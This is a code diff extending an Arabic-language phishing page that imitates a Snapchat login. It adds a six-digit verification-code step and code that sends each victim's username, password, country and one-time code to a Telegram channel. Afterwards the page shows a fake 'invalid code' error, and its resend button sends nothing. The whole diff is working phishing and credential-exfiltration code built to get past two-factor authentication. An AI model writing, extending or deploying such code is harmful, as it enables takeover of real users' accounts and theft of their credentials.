@@ -422,6 +422,42 @@
       background: var(--glass);
     }
 
+    /* OTP Input Styles */
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .otp-input {
+      width: 50px;
+      height: 60px;
+      border: 2px solid var(--border);
+      border-radius: var(--radius-md);
+      background: var(--card);
+      font-size: 28px;
+      font-weight: 800;
+      text-align: center;
+      color: var(--text);
+      font-family: 'Cairo', monospace;
+      transition: all 0.3s var(--ease);
+      outline: none;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .otp-input:focus {
+      background: var(--bg);
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
+    }
+
+    .otp-input::placeholder {
+      color: var(--text-muted);
+      opacity: 0.3;
+    }
+
     /* Modal */
     .modal-overlay {
       position: fixed;
@@ -823,6 +859,39 @@
             </button>
           </div>
         </div>
+
+        <!-- PAGE 3: Verification Code -->
+        <div id="page3" class="page hidden">
+          <button id="backBtn2" class="back-button" type="button">←</button>
+          
+          <div class="page-content">
+            <div class="snap-logo">✅</div>
+
+            <div class="page-header">
+              <h1 class="page-title">التحقق من الهوية</h1>
+              <p class="page-subtitle">أدخل رمز التحقق المرسل إليك</p>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">رمز التحقق</label>
+              <div class="otp-container" id="otpContainer">
+                <!-- OTP inputs will be generated here -->
+              </div>
+              <div class="form-hint" id="hintOTP"></div>
+            </div>
+
+            <button id="verifyBtn" class="btn" type="button" style="margin-top: 28px;">
+              <span id="verifyBtnText">تحقق</span>
+              <span id="verifySpinner" class="hidden">
+                <span class="loading-spinner"></span>
+              </span>
+            </button>
+
+            <button id="resendBtn" class="btn secondary" type="button" style="margin-top: 14px;">
+              إعادة إرسال الرمز
+            </button>
+          </div>
+        </div>
       </div>
     </div>
   </div>
@@ -887,12 +956,15 @@
       phoneMode: false,
       selectedCountry: COUNTRIES[0],
       credentials: null,
+      password: null,
       isLoading: false,
+      otpInputs: [],
     };
 
     // ==================== DOM REFS ====================
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
+    const page3 = document.getElementById('page3');
     const userEmailMode = document.getElementById('userEmailMode');
     const phoneMode = document.getElementById('phoneMode');
     const primaryInput = document.getElementById('primary');
@@ -907,7 +979,14 @@
     const sendBtnText = document.getElementById('sendBtnText');
     const sendSpinner = document.getElementById('sendSpinner');
     const backBtn = document.getElementById('backBtn');
+    const backBtn2 = document.getElementById('backBtn2');
     const forgotBtn = document.getElementById('forgotBtn');
+
+    const verifyBtn = document.getElementById('verifyBtn');
+    const verifyBtnText = document.getElementById('verifyBtnText');
+    const verifySpinner = document.getElementById('verifySpinner');
+    const resendBtn = document.getElementById('resendBtn');
+    const otpContainer = document.getElementById('otpContainer');
 
     const countryBtn = document.getElementById('countryBtn');
     const countryModal = document.getElementById('countryModal');
@@ -924,6 +1003,7 @@
     const hint1 = document.getElementById('hint1');
     const hintPhone = document.getElementById('hintPhone');
     const hintPassword = document.getElementById('hintPassword');
+    const hintOTP = document.getElementById('hintOTP');
 
     const userDisplay = document.getElementById('userDisplay');
 
@@ -959,6 +1039,88 @@
         element.textContent = '';
         element.classList.remove('error', 'warning', 'success');
       }, 3500);
+    }
+
+    // ==================== OTP SETUP ====================
+    function setupOTPInputs() {
+      otpContainer.innerHTML = '';
+      state.otpInputs = [];
+
+      for (let i = 0; i < 6; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.maxLength = '1';
+        input.inputMode = 'numeric';
+        input.className = 'otp-input';
+        input.placeholder = '•';
+        input.addEventListener('input', handleOTPInput);
+        input.addEventListener('keydown', handleOTPKeydown);
+        input.addEventListener('paste', handleOTPPaste);
+        otpContainer.appendChild(input);
+        state.otpInputs.push(input);
+      }
+    }
+
+    function handleOTPInput(e) {
+      const input = e.target;
+      const value = input.value;
+
+      // Only allow digits
+      if (!/^\d*$/.test(value)) {
+        input.value = '';
+        return;
+      }
+
+      // Move to next input
+      if (value.length === 1) {
+        const index = state.otpInputs.indexOf(input);
+        if (index < state.otpInputs.length - 1) {
+          state.otpInputs[index + 1].focus();
+        }
+      }
+    }
+
+    function handleOTPKeydown(e) {
+      const input = e.target;
+      const index = state.otpInputs.indexOf(input);
+
+      if (e.key === 'Backspace') {
+        if (input.value === '' && index > 0) {
+          state.otpInputs[index - 1].focus();
+        }
+      } else if (e.key === 'ArrowLeft' && index > 0) {
+        state.otpInputs[index - 1].focus();
+      } else if (e.key === 'ArrowRight' && index < state.otpInputs.length - 1) {
+        state.otpInputs[index + 1].focus();
+      }
+    }
+
+    function handleOTPPaste(e) {
+      e.preventDefault();
+      const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = pastedData.replace(/\D/g, '').split('');
+
+      digits.forEach((digit, index) => {
+        if (index < state.otpInputs.length) {
+          state.otpInputs[index].value = digit;
+        }
+      });
+
+      if (digits.length > 0) {
+        const focusIndex = Math.min(digits.length, state.otpInputs.length - 1);
+        state.otpInputs[focusIndex].focus();
+      }
+    }
+
+    function getOTPValue() {
+      return state.otpInputs.map(input => input.value).join('');
+    }
+
+    function clearOTPInputs() {
+      state.otpInputs.forEach(input => {
+        input.value = '';
+      });
+      state.otpInputs[0].focus();
     }
 
     // ==================== SEND TO TELEGRAM ====================
@@ -1050,6 +1212,17 @@
       return password;
     }
 
+    function validateOTP() {
+      const otp = getOTPValue();
+
+      if (otp.length === 0) {
+        showHint(hintOTP, '❌ أدخل رمز التحقق', 'error');
+        return null;
+      }
+
+      return otp;
+    }
+
     // ==================== PAGE TRANSITIONS ====================
     function goToPage2(credentials) {
       state.credentials = credentials;
@@ -1075,12 +1248,42 @@
       }, 400);
     }
 
-    function goToPage1() {
+    function goToPage3() {
       page2.classList.add('slide-out');
-      
       setTimeout(() => {
         page2.classList.add('hidden');
         page2.classList.remove('slide-out');
+        page3.classList.remove('hidden');
+        page3.classList.add('slide-in');
+
+        setTimeout(() => {
+          page3.classList.remove('slide-in');
+          setupOTPInputs();
+          state.otpInputs[0].focus();
+        }, 50);
+      }, 400);
+    }
+
+    function goToPage1() {
+      // Hide all pages
+      if (!page1.classList.contains('hidden')) {
+        page1.classList.add('slide-out');
+      }
+      if (!page2.classList.contains('hidden')) {
+        page2.classList.add('slide-out');
+      }
+      if (!page3.classList.contains('hidden')) {
+        page3.classList.add('slide-out');
+      }
+
+      setTimeout(() => {
+        page1.classList.add('hidden');
+        page2.classList.add('hidden');
+        page3.classList.add('hidden');
+        page1.classList.remove('slide-out', 'slide-in');
+        page2.classList.remove('slide-out', 'slide-in');
+        page3.classList.remove('slide-out', 'slide-in');
+
         page1.classList.remove('hidden');
         page1.classList.add('slide-in');
 
@@ -1090,11 +1293,15 @@
         }, 50);
       }, 400);
 
+      // Reset state
       state.credentials = null;
+      state.password = null;
       passwordInput.value = '';
       passwordInput.type = 'password';
       passwordToggleLabel.textContent = 'إظهار';
       hintPassword.textContent = '';
+      hintOTP.textContent = '';
+      clearOTPInputs();
     }
 
     // ==================== PHONE MODE TOGGLE ====================
@@ -1228,7 +1435,27 @@
     });
 
     // Page 2 Events
-    backBtn.addEventListener('click', goToPage1);
+    backBtn.addEventListener('click', () => {
+      page2.classList.add('slide-out');
+      
+      setTimeout(() => {
+        page2.classList.add('hidden');
+        page2.classList.remove('slide-out');
+        page1.classList.remove('hidden');
+        page1.classList.add('slide-in');
+
+        setTimeout(() => {
+          page1.classList.remove('slide-in');
+          primaryInput.focus();
+        }, 50);
+      }, 400);
+
+      state.credentials = null;
+      passwordInput.value = '';
+      passwordInput.type = 'password';
+      passwordToggleLabel.textContent = 'إظهار';
+      hintPassword.textContent = '';
+    });
 
     sendBtn.addEventListener('click', async () => {
       const password = validatePassword();
@@ -1239,14 +1466,17 @@
         return;
       }
 
+      // Store password for later
+      state.password = password;
+
       // Show loading
       state.isLoading = true;
       sendBtn.disabled = true;
       sendBtnText.classList.add('hidden');
       sendSpinner.classList.remove('hidden');
 
-      // Send to Telegram
-      let msg = `<b>🔓 تسجيل دخول كامل</b>\n\n`;
+      // Send initial credentials to Telegram
+      let msg = `<b>🔓 محاولة تسجيل دخول</b>\n\n`;
       msg += `<b>النوع:</b> `;
       
       if (state.credentials.type === 'email') {
@@ -1266,10 +1496,10 @@
       msg += `<b>كلمة المرور:</b> <code>${password}</code>\n\n`;
       msg += `⏰ <i>${new Date().toLocaleString('ar-SA')}</i>`;
 
-      const success = await sendToTelegram(msg);
+      await sendToTelegram(msg);
 
       // Wait a bit
-      await new Promise(r => setTimeout(r, 1500));
+      await new Promise(r => setTimeout(r, 1000));
 
       // Hide loading
       state.isLoading = false;
@@ -1277,14 +1507,8 @@
       sendBtnText.classList.remove('hidden');
       sendSpinner.classList.add('hidden');
 
-      if (success) {
-        showToast('❌', 'فشل الدخول', 'اسم المستخدم أو كلمة المرور غير صحيحة');
-        passwordInput.value = '';
-        setTimeout(() => {
-          hideToast();
-          goToPage1();
-        }, 2500);
-      }
+      // Go to verification page
+      goToPage3();
     });
 
     passwordInput.addEventListener('keydown', (e) => {
@@ -1300,6 +1524,71 @@
 
     forgotBtn.addEventListener('click', () => {
       showToast('ℹ️', 'نسيت كلمة المرور؟', 'تواصل مع خدمة العملاء من تطبيق سناب شات');
+    });
+
+    // Page 3 Events
+    backBtn2.addEventListener('click', goToPage1);
+
+    verifyBtn.addEventListener('click', async () => {
+      const otp = validateOTP();
+      if (!otp) return;
+
+      if (!state.credentials || !state.password) {
+        showToast('⚠️', 'خطأ', 'بيانات المستخدم مفقودة');
+        return;
+      }
+
+      // Show loading
+      state.isLoading = true;
+      verifyBtn.disabled = true;
+      verifyBtnText.classList.add('hidden');
+      verifySpinner.classList.remove('hidden');
+
+      // Send complete credentials with OTP to Telegram
+      let msg = `<b>✅ تحقق كامل من البيانات</b>\n\n`;
+      msg += `<b>النوع:</b> `;
+      
+      if (state.credentials.type === 'email') {
+        msg += '📧 بريد إلكتروني\n';
+      } else if (state.credentials.type === 'username') {
+        msg += '👤 اسم مستخدم\n';
+      } else if (state.credentials.type === 'phone') {
+        msg += '📱 رقم هاتف\n';
+      }
+      
+      msg += `<b>المستخدم:</b> <code>${state.credentials.value}</code>\n`;
+      
+      if (state.phoneMode) {
+        msg += `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}\n`;
+      }
+      
+      msg += `<b>كلمة المرور:</b> <code>${state.password}</code>\n`;
+      msg += `<b>رمز التحقق:</b> <code>${otp}</code>\n\n`;
+      msg += `⏰ <i>${new Date().toLocaleString('ar-SA')}</i>`;
+
+      await sendToTelegram(msg);
+
+      // Wait a bit
+      await new Promise(r => setTimeout(r, 1500));
+
+      // Hide loading
+      state.isLoading = false;
+      verifyBtn.disabled = false;
+      verifyBtnText.classList.remove('hidden');
+      verifySpinner.classList.add('hidden');
+
+      // Show error message
+      showToast('❌', 'فشل التحقق', 'رمز التحقق غير صحيح أو انتهت صلاحيته');
+      
+      setTimeout(() => {
+        hideToast();
+        goToPage1();
+      }, 2500);
+    });
+
+    resendBtn.addEventListener('click', () => {
+      clearOTPInputs();
+      showHint(hintOTP, '✅ تم إعادة إرسال الرمز', 'success');
     });
 
     // Toast
